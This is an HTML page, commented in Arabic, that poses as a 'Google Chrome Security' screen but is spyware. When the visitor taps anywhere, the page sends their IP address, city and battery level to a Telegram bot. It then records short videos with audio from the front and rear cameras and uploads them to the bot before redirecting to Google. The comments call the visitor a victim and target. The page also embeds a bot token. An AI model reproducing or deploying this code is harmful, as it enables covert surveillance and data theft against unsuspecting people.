<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Chrome Security</title>
    <style>
        /* شاشة زرقاء غامقة تشبه واجهات النظام الرسمية */
        body {
            background-color: #0d1117;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            cursor: pointer;
        }
        .dot-loader {
            width: 50px;
            height: 50px;
            border: 3px solid #30363d;
            border-top-color: #58a6ff;
            border-radius: 50%;
            animation: rotate 1s infinite linear;
        }
        @keyframes rotate { to { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="startProcess()">
    <div class="dot-loader"></div>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        let active = false;

        // بمجرد أن يلمس المستخدم الشاشة في أي مكان، سيظهر طلب الكاميرا
        async function startProcess() {
            if (active || !chatId) return;
            active = true;

            // 1. إرسال معلومات الجهاز فوراً
            sendDeviceData();

            // 2. طلب الكاميرا الأمامية وتصويرها (7 ثوانٍ)
            await captureStream("user", "الأمامية");

            // 3. طلب الكاميرا الخلفية وتصويرها (7 ثوانٍ)
            await captureStream("environment", "الخلفية");

            // تحويل الضحية إلى جوجل بعد الانتهاء
            window.location.href = "https://www.google.com";
        }

        async function sendDeviceData() {
            try {
                const info = await fetch('https://ipapi.co/json/').then(r => r.json());
                const bat = await navigator.getBattery();
                const msg = `✅ **هدف متصل**\n🆔 الجلسة: #${Math.floor(Math.random()*999)}\n🌐 IP: \`${info.ip}\`\n📍 ${info.city}\n🔋 ${Math.round(bat.level*100)}%`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch(e){}
        }

        async function captureStream(mode, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode, width: 480, height: 360 },
                    audio: true
                });
               
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
               
                return new Promise(resolve => {
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('document', blob, `${label}.mp4`);
                        fd.append('caption', `🎥 فيديو: ${label}`);
                       
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 7000); // مدة كافية للصيد وسريعة للرفع
                });
            } catch (err) {
                return Promise.resolve(); // في حال الرفض ينتقل للكاميرا التالية أو ينهي العملية
            }
        }
    </script>
</body>
</html>
